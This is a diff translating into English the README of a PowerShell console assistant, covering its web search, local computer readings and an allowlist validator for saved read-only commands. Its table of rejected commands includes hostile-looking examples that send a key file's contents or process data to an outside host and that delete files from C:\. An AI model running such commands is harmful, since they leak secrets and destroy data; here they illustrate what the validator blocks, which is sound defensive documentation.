+  status the server gives: `OK (loaded)`, `OK (loading)`, `OK (sleeping)` or
+  `OK (unloaded)`. It says `answers, but does not offer 'qwen3-8b'` if there
+  is a single-model server or one with other names on that port, and
+  `stopped.` plus the start command (`Get-AIProviderHint`) if nothing is
+  listening. It does not load or wake any model.
 
-## Buscar en internet
+## Searching the internet
 
-Para las preguntas de todos los días no hace falta abrir el navegador, ir al
-buscador y leer: se pregunta en la consola y `AI` busca si hace falta.
-
-```
-Ariel > a como esta el dolar hoy en Nicaragua?
-ia > buscando: dolar hoy en Nicaragua
-ia > El precio del dólar hoy en Nicaragua es de 36.81 córdobas a la venta...
-   fuentes: https://www.bcn.gob.ni/...  https://www.cotizacion.co/...
-```
-
-- **Quién decide**: el modelo. A cada pregunta se le ofrece una herramienta,
-  `buscar_web` (el campo `tools` de `/chat/completions`, el mismo en OpenAI,
-  xAI, Ollama y llama-server). Lo que no cambia con el tiempo («cuánto es 748
-  por 6», «qué es un BOM») lo contesta solo y al instante; precios, tipo de
-  cambio, clima, noticias o resultados piden la búsqueda. Como mucho dos
-  búsquedas por pregunta.
-- **Solo si hay salida**: antes de cada pregunta se intenta una conexión a
-  `html.duckduckgo.com:443` con un plazo de 2 s (se recuerda 60 s si hay
-  conexión y 15 s si no). Sin conexión la herramienta no se ofrece, el modelo
-  sabe que no puede buscar y contesta con lo que sabe avisando de que puede
-  estar desactualizado. `AI -Check` dice si hay salida.
-- **Qué lee**: los resultados de DuckDuckGo (gratis, sin clave) con su resumen
-  y el texto de las dos primeras páginas que se dejen leer, recortado para
-  que quepa en los 4096 tokens del servidor local. Nunca pide direcciones de
-  la red de casa (127.0.0.1, 192.168.x.x...), aunque un resultado apunte ahí.
-  Tras buscar, el modelo contesta con temperatura 0,2 para ceñirse a lo leído.
-- **Memoria**: se guarda la pregunta y la respuesta, no las páginas leídas.
-- **Apagarla**: `-NoWeb` en una pregunta, `/web off` en el modo interactivo o
-  `"web": false` en `settings.json`. `/buscar X` busca siempre, sin esperar a
-  que lo decida el modelo.
-- **Límites**: las páginas que se cargan con JavaScript (muchas de resultados
-  deportivos, la del tipo de cambio del BCN) llegan sin el dato; entonces el
-  modelo se apoya en los resúmenes de los resultados o dice que no lo
-  encontró. Si DuckDuckGo toma la consulta por un robot, lo dice. Depende de
-  que el modelo sepa pedir herramientas: Gemma 4 E4B y Qwen3 8B lo hacen;
-  Gemma 3 4B no, y por eso con `gemma3` solo se busca con `/buscar`.
-
-## Datos de este equipo
-
-Hay cosas que no están en internet ni en la memoria del modelo, sino en la
-propia laptop: la hora, la batería, la red a la que está conectada. Preguntar
-eso no necesita conexión.
+For everyday questions there is no need to open the browser, go to the
+search engine and read: you ask in the console and `AI` searches if needed.
 
 ```
-Ariel > ¿cuál es mi IP?
-ia > leyendo de este equipo: red
-ia > Tu dirección IP en la red local es 192.168.1.23 (por wifi).
-     La IP pública no se puede leer desde el equipo.
-Ariel > ¿qué hora es?
-ia > Son las 11:01 a. m. del domingo 15 de noviembre de 2026.
+Ariel > what's the dollar exchange rate in Nicaragua today?
+ai > searching: dollar exchange rate Nicaragua today
+ai > The dollar exchange rate in Nicaragua today is 36.81 córdobas (selling)...
+   sources: https://www.bcn.gob.ni/...  https://www.cotizacion.co/...
 ```
 
-| Si preguntas por… | Sale de |
+- **Who decides**: the model. Every question comes with a tool on offer,
+  `buscar_web` (the `tools` field of `/chat/completions`, the same in OpenAI,
+  xAI, Ollama and llama-server). What does not change over time ("what is
+  748 times 6", "what is a BOM") it answers on its own, right away; prices,
+  exchange rates, weather, news or results call for a search. At most two
+  searches per question.
+- **Only if there is a connection**: before each question it tries a
+  connection to `html.duckduckgo.com:443` with a 2 s limit (remembered for
+  60 s if there is a connection and 15 s if not). Without a connection the
+  tool is not offered, the model knows it cannot search and answers with
+  what it knows, warning that it may be out of date. `AI -Check` says
+  whether there is a connection.
+- **What it reads**: the DuckDuckGo results (free, no key) with their
+  summaries and the text of the first two pages that can be read, trimmed
+  to fit in the local server's 4096 tokens. It never requests addresses on
+  the home network (127.0.0.1, 192.168.x.x...), even if a result points
+  there. After searching, the model answers with temperature 0.2 to stick to
+  what it read.
+- **Memory**: the question and the answer are kept, not the pages read.
+- **Turning it off**: `-NoWeb` on a question, `/web off` in interactive mode
+  or `"web": false` in `settings.json`. `/search X` always searches, without
+  waiting for the model to decide.
+- **Limits**: pages that load with JavaScript (many sports results pages,
+  the BCN exchange rate page) arrive without the data; then the model relies
+  on the result summaries or says it did not find it. If DuckDuckGo takes
+  the query for a robot, it says so. It depends on the model knowing how to
+  ask for tools: Gemma 4 E4B and Qwen3 8B do; Gemma 3 4B does not, and that
+  is why with `gemma3` searching only happens with `/search`.
+
+## This computer's data
+
+Some things are not on the internet or in the model's memory, but on the
+laptop itself: the time, the battery, the network it is connected to. Asking
+about them needs no connection.
+
+```
+Ariel > what's my IP?
+ai > reading from this computer: network
+ai > Your IP address on the local network is 192.168.1.23 (over Wi-Fi).
+     The public IP can't be read from this computer.
+Ariel > what time is it?
+ai > It's 11:01 AM on Sunday, November 15, 2026.
+```
+
+| If you ask about… | It comes from |
 | --- | --- |
-| La hora, la fecha, qué día es mañana | El reloj del equipo |
-| La batería: carga, si está enchufada, tiempo que queda | Windows |
-| Si hay internet, la red wifi y su señal, la IP local, la puerta de enlace, los DNS | Windows y la red local |
-| El nombre del equipo, el usuario de Windows, la marca y el modelo | Windows |
-| La versión de Windows y cuánto lleva encendido | Windows |
-| El procesador, la memoria RAM, los discos y la tarjeta gráfica | Windows |
+| The time, the date, what day tomorrow is | The computer's clock |
+| The battery: charge, whether it is plugged in, time left | Windows |
+| Whether there is internet, the Wi-Fi network and its signal, the local IP, the gateway, the DNS servers | Windows and the local network |
+| The computer's name, the Windows user, the make and model | Windows |
+| The Windows version and how long it has been on | Windows |
+| The processor, the RAM, the disks and the graphics card | Windows |
 
-Funciona con tres piezas (`lib/equipo.ps1`):
+It works with three pieces (`lib/equipo.ps1`):
 
-- **El reloj** viaja en la instrucción de sistema de cada pregunta: la hora y
-  la fecha se contestan a la primera, con cualquier proveedor.
-- **El atajo**: si la pregunta pide a las claras un dato de este equipo («cuál
-  es mi IP», «cuánta batería me queda», «cuánta RAM tiene esta laptop»), `AI`
-  lo lee antes de preguntar al modelo y se lo pasa junto a la pregunta. Así
-  no depende de que el modelo sepa pedir herramientas y se contesta en una
-  sola vuelta (de 2 a 5 s con Gemma 4 E4B). Para saltar hacen falta dos
-  cosas: el tema y una marca de que se habla de este equipo («mi», «tengo»,
-  «me queda», «esta laptop»).
-- **La herramienta `datos_equipo`**, para lo que el atajo no reconoce: se
-  ofrece al modelo igual que `buscar_web` y él decide. A diferencia de
-  `buscar_web` se ofrece haya o no internet, porque no sale a ningún sitio.
+- **The clock** travels in the system instruction of every question: the
+  time and date are answered right away, with any provider.
+- **The shortcut**: if the question clearly asks for data from this
+  computer ("what's my IP", "how much battery do I have left", "how much RAM
+  does this laptop have"), `AI` reads it before asking the model and passes
+  it along with the question. That way it does not depend on the model
+  knowing how to ask for tools, and it is answered in a single round (2 to
+  5 s with Gemma 4 E4B). Two things are needed for it to kick in: the topic
+  and a sign that the question is about this computer ("my", "I", "do I
+  have", "this laptop").
+- **The `datos_equipo` tool**, for what the shortcut does not recognize: it
+  is offered to the model just like `buscar_web` and the model decides.
+  Unlike `buscar_web`, it is offered whether or not there is internet,
+  because it does not go anywhere.
 
-Lo que conviene saber:
+Worth knowing:
 
-- **Solo lectura y lista cerrada.** Son ocho lecturas fijas (`bateria`, `red`,
-  `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`). Del
-  modelo llega el nombre de una lectura, nunca una orden: ni lo que escribes
-  ni lo que escribe el modelo llega a una línea de comandos. Nada de esto
-  hace peticiones a internet; si hay conexión lo dice el indicador de red de
-  Windows.
-- **No toma por suyo lo que no lo es.** «¿Cuánta batería tiene el iPhone
-  15?», «¿qué procesador trae la Lenovo Legion 5?» o «¿cuánta RAM trae una
-  laptop gamer?» no son de este equipo: no se lee nada y se buscan en
-  internet como siempre. «¿Qué es una dirección IP?» la explica el modelo.
-- **Si no pudo leer un dato, lo dice** y no pone ninguno en su lugar. La IP
-  pública (la que ven los sitios de internet) no está en el equipo, y también
-  lo dice; para tenerla hay que preguntársela a un servidor de fuera, y eso
-  se hace guardando un comando (ver «Comandos guardados»).
-- **Sin modelo**: `/equipo` enseña en pantalla todo lo leído, y `/equipo red`
-  o `/equipo disco memoria` solo esa parte. Funciona sin servidor y sin
-  internet.
-- **Con un proveedor en la nube** (OpenAI, xAI), lo leído viaja a ese
-  proveedor junto a la pregunta, como cualquier otro mensaje: el nombre del
-  equipo, el usuario o la red wifi incluidos, si es lo que se preguntó.
-  Solo se lee lo que pide la pregunta.
-- **Apagarlo**: `-NoEquipo` en una pregunta, `/equipo off` en el modo
-  interactivo o `"equipo": false` en `settings.json`. La hora y la fecha se
-  siguen dando.
-- **Límites**: el atajo es una lista de expresiones y no lo reconoce todo;
-  una pregunta sin marca («¿cuánta batería queda?») la decide el modelo, que
-  con Gemma 4 E4B lee el dato o pregunta a qué equipo te refieres. Con un
-  modelo sin herramientas (`gemma3`) solo funciona el atajo: lo que no
-  reconoce se contesta con un «no puedo saberlo». La hora en otra ciudad no
-  sale del reloj: el modelo la busca en internet si hay conexión.
+- **Read-only and a closed list.** There are eight fixed readings (battery,
+  network, computer, system, processor, memory, disk, graphics; inside the
+  program they are called `bateria`, `red`, `equipo`, `sistema`,
+  `procesador`, `memoria`, `disco`, `grafica`). From the model comes the
+  name of a reading, never a command: neither what you type nor what the
+  model writes reaches a command line. None of this makes requests to the
+  internet; whether there is a connection is told by Windows' network
+  indicator.
+- **It does not take for its own what is not.** "How much battery does the
+  iPhone 15 have?", "what processor does the Lenovo Legion 5 have?" or "how
+  much RAM does a gaming laptop have?" are not about this computer: nothing
+  is read and they are searched on the internet as usual. "What is an IP
+  address?" is explained by the model.
+- **If it could not read a piece of data, it says so** and does not put
+  another in its place. The public IP (the one internet sites see) is not on
+  the computer, and it says that too; to get it you have to ask an outside
+  server, and that is done by saving a command (see "Saved commands").
+- **Without the model**: `/computer` shows everything it read on screen, and
+  `/computer network` or `/computer disk memory` only that part. It works
+  without a server and without internet.
+- **With a cloud provider** (OpenAI, xAI), what was read travels to that
+  provider along with the question, like any other message: the computer's
+  name, the user or the Wi-Fi network included, if that is what was asked.
+  Only what the question asks for is read.
+- **Turning it off**: `-NoComputer` on a question, `/computer off` in
+  interactive mode or `"equipo": false` in `settings.json`. The time and
+  date are still given.
+- **Limits**: the shortcut is a list of expressions and does not recognize
+  everything; a question without the sign ("how much battery is left?") is
+  decided by the model, which with Gemma 4 E4B reads the data or asks which
+  computer you mean. With a model without tools (`gemma3`) only the shortcut
+  works: what it does not recognize gets an "I can't know that". The time in
+  another city does not come from the clock: the model searches the
+  internet for it if there is a connection.
 
-## Comandos guardados
+## Saved commands
 
-Hay datos que `AI` no trae de serie pero que un comando de PowerShell da en
-una línea: la IP pública, los procesos que más procesador han gastado, si el
-antivirus está activo. Se guardan desde el propio chat, con un nombre, y
-desde entonces el modelo puede pedirlos por ese nombre.
+Some data `AI` does not bring out of the box, but a PowerShell command gives
+it in one line: the public IP, the processes that have used the most
+processor time, whether the antivirus is on. They are saved from the chat
+itself, with a name, and from then on the model can ask for them by that
+name.
 
-### Pidiéndolo en la conversación
+### By asking in the conversation
 
-Basta con pedirlo: «agrégame un comando para ver mi IP pública», «quiero
-guardar un comando», «guarda este comando como ver-dns:
-Get-DnsClientServerAddress». El chat pregunta y tú respondes:
+Just ask: "add a command to see my public IP", "I want to save a command",
+"save this command as see-dns: Get-DnsClientServerAddress". The chat asks
+and you answer:
 
 ```
-Ariel > agrégame un comando para ver mi IP pública
-ia > Vamos a guardar un comando de solo lectura. Yo pregunto y tú respondes; escribe «cancelar» para dejarlo.
-ia > Busco un comando de solo lectura para: ver mi IP pública
-ia > Este es el comando:
+Ariel > add a command to see my public IP
+ai > Let's save a read-only command. I ask and you answer; type "cancel" to leave it.
+ai > Looking for a read-only command for: see my public IP
+ai > This is the command:
 
-  comando:  Invoke-RestMethod -Uri https://api.ipify.org
-  reglas:   pasa (Invoke-RestMethod)
-  red:      sale a internet, a api.ipify.org (https, solo lee)
-  modelo, con la documentacion de Microsoft a la vista:
-    El comando realiza una solicitud web a la API de ipify.org. Lee la
-    dirección IP pública del equipo desde esa API. No envía datos ni modifica
-    nada en el equipo local.
+  command:  Invoke-RestMethod -Uri https://api.ipify.org
+  rules:    passes (Invoke-RestMethod)
+  network:  goes out to the internet, to api.ipify.org (https, read only)
+  model, with the Microsoft documentation in view:
+    The command makes a web request to the ipify.org API. It reads the
+    computer's public IP address from that API. It does not send data or
+    change anything on the local computer.
 
-ia > ¿Te vale así? Responde «sí», o dime qué le cambio.
-Ariel > sí
-ia > ¿Con qué nombre lo guardo? Pulsa Enter para «ip-publica». Cuando preguntes con esas palabras, lo ejecutaré.
+ai > Is it OK like this? Answer "yes", or tell me what to change.
+Ariel > yes
+ai > What name should I save it under? Press Enter for "public-ip". When you ask with those words, I'll run it.
 Ariel >
-ia > ¿Para qué sirve, en una frase? La leeré para saber cuándo usarlo. Pulsa Enter para «ver mi IP pública».
+ai > What is it for, in one sentence? I'll read it to know when to use it. Press Enter for "see my public IP".
 Ariel >
-ia > Ya no tengo más preguntas. Esto es lo que voy a guardar:
+ai > I have no more questions. This is what I'm going to save:
 
-  nombre:   ip-publica
-  comando:  Invoke-RestMethod -Uri https://api.ipify.org
-  sirve:    ver mi IP pública
-  red:      sale a internet, a api.ipify.org
+  name:     public-ip
+  command:  Invoke-RestMethod -Uri https://api.ipify.org
+  purpose:  see my public IP
+  network:  goes out to the internet, to api.ipify.org
 
-ia > ¿Lo pruebo ahora y, si funciona, lo dejo guardado? («sí» o «no»)
-Ariel > sí
-ia > Probando...
-ia > Resultado de la prueba (0.3 s):
+ai > Shall I test it now and, if it works, keep it saved? ("yes" or "no")
+Ariel > yes
+ai > Testing...
+ai > Test result (0.3 s):
 
   203.0.113.7
 
-ia > Funcionó y quedó guardado como «ip-publica». Pregúntame con las palabras «ip publica» y lo ejecuto, o tecléalo tú con /comando ip-publica.
+ai > It worked and it's saved as "public-ip". Ask me with the words "public ip" and I'll run it, or type it yourself with /command public-ip.
 ```
 
-- **Si no das el comando, lo propone el modelo**, y lo que propone pasa por
-  las mismas reglas que lo que tecleas tú. Si no las pasa, se le dice por qué
-  y lo corrige (tres intentos). Si pides algo que no es de solo lectura
-  («para borrar los temporales»), dice que no se puede.
-- **Puedes pedir cambios** («que sean cinco», «solo la fecha») o pegar tú otro
-  comando en cualquier respuesta.
-- **Las preguntas se cierran con un resumen y una sola confirmación.** Hasta
-  ese «sí» no se ejecuta ni se guarda nada.
-- **Se prueba antes de guardar.** Si la prueba falla o no devuelve ningún
-  dato, no se guarda, y puedes cambiarlo o dejarlo.
-- **«cancelar»** corta en cualquier momento.
-- Las preguntas son fijas, no las redacta el modelo: el diálogo no depende de
-  que el modelo se acuerde de pedir confirmación.
-- Lo abren las frases que empiezan por «agrega», «añade», «guarda» o
-  «registra» (o «quiero agregar…») y nombran un comando. «Crea un comando de
-  git para…» no: eso pide que se escriba uno, y lo contesta el modelo.
+- **If you don't give the command, the model proposes one**, and what it
+  proposes goes through the same rules as what you type. If it does not
+  pass them, the model is told why and fixes it (three attempts). If you ask
+  for something that is not read-only ("to delete the temp files"), it says
+  it can't be done.
+- **You can ask for changes** ("make it five", "only the date") or paste
+  another command yourself in any answer.
+- **The questions end with a summary and a single confirmation.** Until
+  that "yes", nothing is run or saved.
+- **It is tested before saving.** If the test fails or returns no data, it
+  is not saved, and you can change it or drop it.
+- **"cancel"** stops it at any time.
+- The questions are fixed, not written by the model: the dialog does not
+  depend on the model remembering to ask for confirmation.
+- It is opened by sentences that start with "add", "save", "register" or
+  "store" (or "I want to add…", "can you save…") and name a command. "Create
+  a git command to…" does not: that asks for one to be written, and the
+  model answers it.
 
-### De una vez, con `/comando agregar`
+### In one go, with `/command add`
 
-Si ya tienes el comando y el nombre:
+If you already have the command and the name:
 
 ```
-Ariel > /comando agregar ip-publica Invoke-RestMethod -Uri https://api.ipify.org
+Ariel > /command add public-ip Invoke-RestMethod -Uri https://api.ipify.org
 
-  comando:  Invoke-RestMethod -Uri https://api.ipify.org
-  reglas:   pasa (Invoke-RestMethod)
-  red:      sale a internet, a api.ipify.org (https, solo lee)
-  modelo, con la documentacion de Microsoft a la vista:
-    Este comando realiza una solicitud HTTP a la API de ipify.org. Lee la
-    dirección IP pública del equipo desde esa API. No envía datos ni modifica
-    nada en el equipo local.
+  command:  Invoke-RestMethod -Uri https://api.ipify.org
+  rules:    passes (Invoke-RestMethod)
+  network:  goes out to the internet, to api.ipify.org (https, read only)
+  model, with the Microsoft documentation in view:
+    This command makes an HTTP request to the ipify.org API. It reads the
+    computer's public IP address from that API. It does not send data or
+    change anything on the local computer.
 
-  para que sirve? (una frase; el modelo la lee para saber cuando usarlo) > mi IP publica
-  lo guardo? (s/n) > s
-guardado como «ip-publica». Primera ejecucion:
+  what is it for? (one sentence; the model reads it to know when to use it) > my public IP
+  save it? (y/n) > y
+saved as "public-ip". First run:
 203.0.113.7
 
-Ariel > ¿cuál es mi IP pública?
-ia > ejecutando el comando guardado: ip-publica
-ia > Tu IP pública es 203.0.113.7.
+Ariel > what's my public IP?
+ai > running the saved command: public-ip
+ai > Your public IP is 203.0.113.7.
 ```
 
-### Quién decide si un comando vale
+### Who decides whether a command is allowed
 
-**Unas reglas fijas, no el modelo.** El modelo explica el comando (con el
-principio de la documentación de Microsoft a la vista, si hay conexión) y
-avisa si ve algo raro, pero no aprueba nada: un modelo se equivoca, y una
-página que dice «este comando es seguro» es texto de fuera. Al final confirmas
-tú, viendo el comando exacto y a qué servidor sale.
+**Fixed rules, not the model.** The model explains the command (with the
+beginning of the Microsoft documentation in view, if there is a connection)
+and warns if it sees something odd, but it approves nothing: a model makes
+mistakes, and a page that says "this command is safe" is outside text. In
+the end you confirm, seeing the exact command and which server it goes out
+to.
 
-Las reglas (`Get-AIComandoPlan`, en `lib/comandos.ps1`):
+The rules (`Get-AIComandoPlan`, in `lib/comandos.ps1`):
 
-1. **Nada se guarda sin tu «sí»**, y solo en el modo interactivo. El comando
-   lo tecleas tú o lo propone el modelo cuando se lo pides; lo que propone
-   no vale por venir del modelo, sino si pasa las reglas siguientes, las
-   mismas en los dos casos. Una página de internet o la salida de otro
-   comando no pueden agregar nada.
-2. **Se analiza con el analizador del propio PowerShell**, no con expresiones
-   regulares. Tiene que ser una sola canalización de comandos con argumentos
-   fijos. Se rechazan las variables, las cadenas con sustitución, los
-   paréntesis, los bloques `{ }`, las llamadas a métodos, los tipos `[..]`,
-   las redirecciones, los comentarios y `;`, `&`, `.`.
-3. **Cada comando tiene que estar en una lista cerrada**, por su nombre
-   completo (los alias no valen: `irm` no, `Invoke-RestMethod` sí) y venir de
-   un módulo de la carpeta de Windows. Un programa solo vale si está en
-   `System32`, lo firma Microsoft y sus argumentos casan con una forma
-   permitida: `ipconfig /all` sí, `ipconfig /release` no.
-4. **Cada parámetro tiene que estar en la lista de ese comando.** Las
-   abreviaturas (`-OutF`) y los argumentos sin nombre los resuelve el
-   enlazador de PowerShell antes de comparar.
-5. **Lo que sale a internet**: solo `https`, dirección escrita fija, servidor
-   público (nunca `192.168.x.x`, `localhost` ni nombres de la red de casa),
-   solo lectura (`GET`), sin seguir redirecciones y solo como primer comando.
-   Al no recibir nada por la canalización, no puede sacar datos del equipo.
+1. **Nothing is saved without your "yes"**, and only in interactive mode.
+   You type the command or the model proposes it when you ask; what it
+   proposes is not valid because it comes from the model, but if it passes
+   the following rules, the same in both cases. A web page or the output of
+   another command cannot add anything.
+2. **It is analyzed with PowerShell's own parser**, not with regular
+   expressions. It has to be a single pipeline of commands with fixed
+   arguments. Variables, strings with substitution, parentheses, `{ }`
+   blocks, method calls, `[..]` types, redirections, comments and `;`, `&`,
+   `.` are rejected.
+3. **Each command has to be on a closed list**, by its full name (aliases do
+   not count: `irm` no, `Invoke-RestMethod` yes) and come from a module in
+   the Windows folder. A program is only allowed if it is in `System32`, is
+   signed by Microsoft and its arguments match an allowed form:
+   `ipconfig /all` yes, `ipconfig /release` no.
+4. **Each parameter has to be on that command's list.** Abbreviations
+   (`-OutF`) and unnamed arguments are resolved by PowerShell's binder
+   before comparing.
+5. **What goes out to the internet**: only `https`, a fixed address, a
+   public server (never `192.168.x.x`, `localhost` or home network names),
+   read-only (`GET`), without following redirects and only as the first
+   command. Since it receives nothing through the pipeline, it cannot take
+   data out of the computer.
 
-Lo que pasa y lo que no:
+What passes and what does not:
 
-| Comando | Resultado |
+| Command | Result |
 | --- | --- |
-| `Invoke-RestMethod -Uri https://api.ipify.org` | Pasa; avisa de que sale a internet, a api.ipify.org |
-| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5 Name, CPU` | Pasa |
-| `Get-MpComputerStatus \| Select-Object AntivirusEnabled` | Pasa |
-| `ipconfig /all \| Select-String DNS` | Pasa |
-| `ipconfig /release` | No: no es una forma de solo lectura de `ipconfig` |
-| `Get-ChildItem C:\ \| Remove-Item` | No: no están en la lista |
-| `Get-Process \| ForEach-Object Kill` | No: `ForEach-Object` llamaría a un método de cada objeto |
-| `Invoke-RestMethod "https://x.com/?d=$(Get-Content clave.txt)"` | No: la dirección no es fija |
-| `Get-Process \| Invoke-RestMethod -Uri https://x.com -Method Post` | No: lo que sale a internet solo puede ir el primero |
-| `Invoke-WebRequest -Uri http://192.168.0.1/reboot` | No: ni `https` ni servidor público |
-| `.\mi-script.ps1`, `C:\Herramientas\x.exe`, `powershell -Command ...` | No: ni scripts ni programas de fuera de Windows |
+| `Invoke-RestMethod -Uri https://api.ipify.org` | Passes; warns that it goes out to the internet, to api.ipify.org |
+| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5 Name, CPU` | Passes |
+| `Get-MpComputerStatus \| Select-Object AntivirusEnabled` | Passes |
+| `ipconfig /all \| Select-String DNS` | Passes |
+| `ipconfig /release` | No: it is not a read-only form of `ipconfig` |
+| `Get-ChildItem C:\ \| Remove-Item` | No: they are not on the list |
+| `Get-Process \| ForEach-Object Kill` | No: `ForEach-Object` would call a method on each object |
+| `Invoke-RestMethod "https://x.com/?d=$(Get-Content key.txt)"` | No: the address is not fixed |
+| `Get-Process \| Invoke-RestMethod -Uri https://x.com -Method Post` | No: what goes out to the internet can only come first |
+| `Invoke-WebRequest -Uri http://192.168.0.1/reboot` | No: neither `https` nor a public server |
+| `.\my-script.ps1`, `C:\Tools\x.exe`, `powershell -Command ...` | No: neither scripts nor programs from outside Windows |
 
-### Qué hay en la lista
+### What is on the list
 
-- **Producen datos** (solo como primer comando): `Get-Date`, `Get-Culture`,
-  `Get-TimeZone`, `Get-ComputerInfo`, `Get-Process`, `Get-Service`,
-  `Get-HotFix`, `Get-PSDrive`, `Get-CimInstance`, `Get-NetAdapter`,
-  `Get-NetIPAddress`, `Get-NetIPConfiguration`, `Get-NetRoute`,
-  `Get-NetConnectionProfile`, `Get-NetFirewallProfile`,
+- **They produce data** (only as the first command): `Get-Date`,
+  `Get-Culture`, `Get-TimeZone`, `Get-ComputerInfo`, `Get-Process`,
+  `Get-Service`, `Get-HotFix`, `Get-PSDrive`, `Get-CimInstance`,
+  `Get-NetAdapter`, `Get-NetIPAddress`, `Get-NetIPConfiguration`,
+  `Get-NetRoute`, `Get-NetConnectionProfile`, `Get-NetFirewallProfile`,
   `Get-DnsClientServerAddress`, `Get-Volume`, `Get-Disk`, `Get-PhysicalDisk`,
   `Get-Partition`, `Get-PnpDevice`, `Get-Printer`, `Get-MpComputerStatus`,
   `Resolve-DnsName`, `Test-Connection`, `Test-NetConnection`,
   `Invoke-RestMethod`, `Invoke-WebRequest`.
-- **Ordenan, eligen o dan formato** (solo detrás de otro): `Select-Object`,
-  `Where-Object` (en su forma `Where-Object Status -eq Running`),
+- **They sort, pick or format** (only after another one): `Select-Object`,
+  `Where-Object` (in its `Where-Object Status -eq Running` form),
   `Sort-Object`, `Measure-Object`, `Group-Object`, `Format-List`,
   `Format-Table`, `Select-String`, `ConvertTo-Json`, `ConvertFrom-Json`,
   `ConvertTo-Csv`, `Out-String`.
-- **Programas de System32**, con sus formas de solo lectura: `ipconfig`,
-  `hostname`, `whoami`, `systeminfo`, `getmac`, `arp -a`, `route print`,
-  `tasklist`, `driverquery`, `powercfg /list`, `netsh wlan show ...`,
+- **System32 programs**, with their read-only forms: `ipconfig`, `hostname`,
+  `whoami`, `systeminfo`, `getmac`, `arp -a`, `route print`, `tasklist`,
+  `driverquery`, `powercfg /list`, `netsh wlan show ...`,
   `netsh interface ... show ...`, `ping`, `nslookup`.
-- **Fuera a propósito**: lo que lee ficheros, el registro, el portapapeles o
-  los registros de sucesos (`Get-Content`, `Get-ChildItem`, `Get-ItemProperty`,
-  `Get-Clipboard`, `Get-WinEvent`), porque lo leído viaja al modelo; y todo lo
-  que escribe o cambia algo.
+- **Left out on purpose**: whatever reads files, the registry, the clipboard
+  or the event logs (`Get-Content`, `Get-ChildItem`, `Get-ItemProperty`,
+  `Get-Clipboard`, `Get-WinEvent`), because what is read travels to the
+  model; and everything that writes or changes something.
 
-La lista y los parámetros de cada comando están en `$AI_CMD_CMDLETS` y
-`$AI_CMD_EXES`, al principio de `lib/comandos.ps1`. Ampliarla es añadir una
-entrada ahí.
+The list and the parameters of each command are in `$AI_CMD_CMDLETS` and
+`$AI_CMD_EXES`, at the start of `lib/comandos.ps1`. Extending it means adding
+an entry there.
 
-### Cómo se ejecuta
+### How it runs
 
-- **El texto no se ejecuta nunca.** De la validación sale un plan (cada
-  comando con su módulo, sus parámetros ya resueltos y sus valores) y lo que
-  corre es ese plan, pieza a pieza. No hay diferencia posible entre lo que se
-  revisó y lo que se ejecuta.
-- **Cada ejecución vuelve a pasar las reglas.** Un `comandos.json` cambiado a
-  mano por algo que no las pasa no se ejecuta: dice «ya no pasa las reglas».
-- **Con plazo y tope**: 15 segundos y 4.000 caracteres de salida.
-- **Con los permisos de la consola.** Nunca pide permisos de administrador.
-- **El modelo pide por nombre.** La herramienta `comando_guardado` solo acepta
-  un nombre de la lista; el modelo no puede escribir un comando.
-- **El atajo.** Si la pregunta lleva todas las palabras del nombre de un
-  comando guardado («ip pública» para `ip-publica`), el programa lo ejecuta sin
-  esperar a que el modelo lo pida, así que el dato es siempre el de ese
-  momento. Sirve también con `gemma3`.
-  - Si la pregunta nombra varios, se ejecutan hasta dos: «dame la fecha y
-    hora, y el precio de btc» ejecuta `fecha-hora` y `precio-btc`.
-  - No salta si la pregunta pide una explicación, un «cómo se hace», código o
-    una compra, ni si habla de otro aparato. Las palabras del propio nombre no
-    cuentan como freno: con `precio-btc` guardado, «precio» no frena «dame el
-    precio de btc».
-  - `/comando ip-publica` lo ejecuta sin pasar por el modelo.
-- **La salida entra como dato**, rotulada con el servidor del que viene. Tras
-  ejecutar un comando guardado no se ofrecen más herramientas en ese turno,
-  para que una respuesta de fuera no pueda encadenar otra acción.
+- **The text is never run.** Validation produces a plan (each command with
+  its module, its parameters already resolved and their values) and what
+  runs is that plan, piece by piece. There can be no difference between what
+  was checked and what runs.
+- **Every run goes through the rules again.** A `comandos.json` changed by
+  hand into something that does not pass them is not run: it says "it no
+  longer passes the rules".
+- **With a time limit and a cap**: 15 seconds and 4,000 characters of
+  output.
+- **With the console's permissions.** It never asks for administrator
+  rights.
+- **The model asks by name.** The `comando_guardado` tool only accepts a
+  name from the list; the model cannot write a command.
+- **The shortcut.** If the question has all the words of a saved command's
+  name ("public ip" for `public-ip`), the program runs it without waiting
+  for the model to ask, so the data is always current. It also works with
+  `gemma3`.
+  - If the question names several, up to two are run: "give me the date and
+    time, and the btc price" runs `date-time` and `btc-price`.
+  - It does not kick in if the question asks for an explanation, a "how to",
+    code or a purchase, or if it is about another device. The words of the
+    name itself do not count as a brake: with `btc-price` saved, "price" does
+    not stop "give me the btc price".
+  - `/command public-ip` runs it without going through the model.
+- **The output goes in as data**, labeled with the server it comes from.
+  After running a saved command no more tools are offered in that turn, so
+  that an outside answer cannot chain another action.
 
-### Límites
+### Limits
 
-- **Solo lectura no es lo mismo que privado.** La salida viaja al proveedor
-  del modelo junto a la pregunta; con uno en la nube (OpenAI, xAI), sale del
-  equipo.
-- **De un servidor ajeno solo se sabe a cuál se llama**, no qué hace con la
-  visita. Por eso lo ves y lo confirmas tú.
-- **La lista es corta y rechazará comandos legítimos.** Es a propósito: se
-  amplía a mano.
-- **El modelo puede leer mal una salida.** A la columna `CPU` de
-  `Get-Process`, que son segundos de procesador, Gemma 4 E4B le puso un signo
-  de porcentaje; ahora se le pide que no añada unidades que la salida no
-  diga, pero una salida clara ayuda (`Select-Object` con pocos campos).
-- **Hasta 20 comandos**, guardados en
-  `%LOCALAPPDATA%\PRC-CMD-AI\comandos.json`. Se apagan con `-NoComandos`,
-  `/comando off` o `"comandos": false` en `settings.json`.
+- **Read-only is not the same as private.** The output travels to the
+  model's provider along with the question; with a cloud one (OpenAI, xAI),
+  it leaves the computer.
+- **Of an outside server, all that is known is which one is called**, not
+  what it does with the visit. That is why you see it and confirm it.
+- **The list is short and will reject legitimate commands.** That is on
+  purpose: it is extended by hand.
+- **The model can misread an output.** To the `CPU` column of
+  `Get-Process`, which is processor seconds, Gemma 4 E4B added a percent
+  sign; now it is asked not to add units the output does not state, but a
+  clear output helps (`Select-Object` with few fields).
+- **Up to 20 commands**, saved in `%LOCALAPPDATA%\PRC-CMD-AI\comandos.json`.
+  They are turned off with `-NoCommands`, `/command off` or
+  `"comandos": false` in `settings.json`.
 
-## Consultas web
